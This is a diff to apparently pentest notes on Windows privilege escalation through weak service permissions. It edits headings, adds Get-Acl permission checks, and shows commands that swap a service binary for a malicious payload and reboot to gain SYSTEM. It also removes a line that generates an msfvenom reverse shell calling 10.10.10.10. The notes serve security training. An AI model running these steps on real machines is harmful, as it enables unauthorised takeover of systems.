@@ -322,7 +322,7 @@ msiexec /quiet /qn /i c:\users\user\documents\shell.msi
 
 > **Note:** I'd problems while exploiting it via WIN-RM. Try another way to get shell.
 
-# Incorrect permissions in services
+# Weak Service Permissions
 
 A service running as `NT AUTHORITY/SYSTEM` with incorrect file permissions might allow to escalate privileges. You can replace the binary, restart the service and get system.
 
@@ -343,7 +343,7 @@ We can also check the services whose configuration the current user can modify.
 ```powershell
 Get-ModifiableService -Verbose
 ```
-## Modifying the service
+## Modifying the service configuration
 
 Check service permissions with `accesschk` from sysinternals.
 
@@ -369,10 +369,17 @@ sc qc <service> #Check correct assigment
 sc start <service>
 ```
 
+## Binary Permissions
+
+We can also have sufficient rights to modify the binary itself, with `Get-Acl` from powershell we can check it.
+
+```powershell
+Get-Acl -Path "C:\Program Files\VulnServ\vulnserv.exe" | fl
+```
 
 ## Writeable Folders
 
-Check permissions on folders.
+We can also have rights to write into the folder but not into the binary itself. We cab check permissions on folders with `icacls` or `Get-Acl`.
 
 ```
 C:\>icacls exacqVisionEsm
@@ -394,13 +401,16 @@ exacqVisionEsm NT AUTHORITY\NETWORK SERVICE:(RX)
 * **Read-only acess (R)**: Only can read, nothing here.
 * **Write-only acess (W)**: Only can write, same as (F), change the binary to the malicious one. `PRIV PATH`
 
+
+```powershell
+Get-Acl -Path "C:\Program Files\VulnServ\vulnserv.exe" | fl
+```
+
 **Changing the original binary:**
 
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o mal.exe
-
 move .\enterprisesystemmanager.exe .\enterprisesystemmanager.bak
-move C:\Windows\Temp\rev.exe .\enterprisesystemmanager.exe
+move C:\Windows\Temp\payload.exe .\enterprisesystemmanager.exe
 ```
 
 Check the configuration of the service to see how to restart the service.
@@ -420,7 +430,7 @@ net start ServiceName
 
 * **AUTO\_START enabled**
 
-If AUTO\_START flag is enabled restart the machine
+If `AUTO_START` flag is enabled restart the machine
 
 ```
 shutdown /r
